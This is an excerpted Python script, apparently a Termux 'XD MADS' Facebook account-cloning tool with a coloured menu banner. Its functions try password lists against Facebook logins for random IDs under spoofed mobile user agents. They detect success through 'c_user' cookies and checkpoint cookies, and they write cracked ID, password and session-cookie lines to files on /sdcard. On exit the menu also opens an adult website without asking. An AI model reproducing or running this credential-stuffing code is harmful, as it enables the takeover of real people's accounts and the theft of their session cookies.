...
╚═╝  ╚═╝
 ...
 \033[91;1m   ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} XD MADS                   {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}FAHIM ISLAM               {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M} xxxxxxxxxxxxxxx           {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/XD-MADS-12{N} {H} ║
  {H}  ║{P}[{H}•{P}] Status    : {H}FREE {P}     {N}      {H}     ║
   {H} ║{P}[{H}•{P}] Network   : {H} Depends on you {H}      ║
   {H} ║{P}[{H}•{P}] Version   : {H}0.0.1                  ║
   {H} ║{P}[{H}•{P}] Tools     : {H}XD MADS 💥              ║
   {M} ╚════════════════════════════════════════╝ {P}""")
    print(f"""{GREEN}    SELL DONE{P}
 {K}[{H}√{K}]{P} This message is for my haters 
 {K}[{H}√{K}]{P}       {H} XD MADS
 {K}[{H}√{K}]{P} Successfully Update Done {H}1.0.1""");print(led)
...
def mainx():
    ...
    print(f'{K} [{H}8{K}] {N}Contract XD MADS ')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/XD-MADS-12");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/profile.php?id=Mr.AHS12");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}XD MADS {P}Terminal ');os.system("xdg-open https://www.facebook.com/profile.php?id=Mr.AHS12");time.sleep(3);os.system('xdg-open https://xvideos.com/');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/profile.php?id=Mr.AHS12");mainx()
def mainx2():
    os.system("clear")
    banner()
    ...
    print(f"{K} [{H}4{K}] {WHITE}Random Cloning {H}BD/Pak/Ind")
...
def sep():
    ...
    print(led);print(f'{dot}Total File Ids {M}:{H} ' +
          str(len(open(file_name).read().splitlines())));print(led);print(f'{gen}Example {M}:{H} /sdcard/XD.txt');print(led)
...
def dupcutter():
    os.system('clear');banner();print(f'{dot}Example   {RED}:{H} /sdcard/XD.txt');print(led)
    Error = input(f"{wt}{N}File Name {RED}:{H} ");print(led);print(f'{dot}Example   {RED}:{H} /sdcard/XD.txt');print(led)
...
def x7():
  ...
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-AKASH .py')
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mXD ","\x1b[1;92mXD ","\x1b[1;93mXD ","\x1b[1;94mXD ","\x1b[1;95mXD ","\x1b[1;96mXD ","\x1b[1;97mXD ","\x1b[1;91mXD ","\x1b[1;92mXD ","\x1b[1;93mXD ","\x1b[1;94mXD ","\x1b[1;95mXD ","\x1b[1;96mXD "])
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mXD -CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/XD -GREEN-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                ok+=1
                print(f'\r{P} [{H}XD -OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/XD -GREEN-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
  ...
  for pw in pwv:
    ...
    'viewport-width': '980',
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30mXD -CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/XD -GREEN-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        ...
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/XD -GREEN-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
...
#'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [XD -OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/XD -GREEN-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mXD -CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/XD -GREEN-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
...
def m5(idf,pw):
 ...
 try:
  for ps in pw:
   session = requests.Session()
            #animasi = random.choice(["\x1b[1;91mAKASH ","\x1b[1;92mAKASH ","\x1b[1;93mAKASH ","\x1b[1;94mAKASH ","\x1b[1;95mAKASH ","\x1b[1;96mAKASH ","\x1b[1;97mAKASH ","\x1b[1;91mAKASH ","\x1b[1;92mAKASH ","\x1b[1;93mAKASH ","\x1b[1;94mAKASH ","\x1b[1;95mAKASH ","\x1b[1;96mAKASH "])
...
if __name__=='__main__':
  try:os.mkdir('AKASH -AKASH')
  except:pass
  try:os.mkdir('QUEEN-MITALI')
  except:pass
#  b2()
#  mainx() 
  mainx()
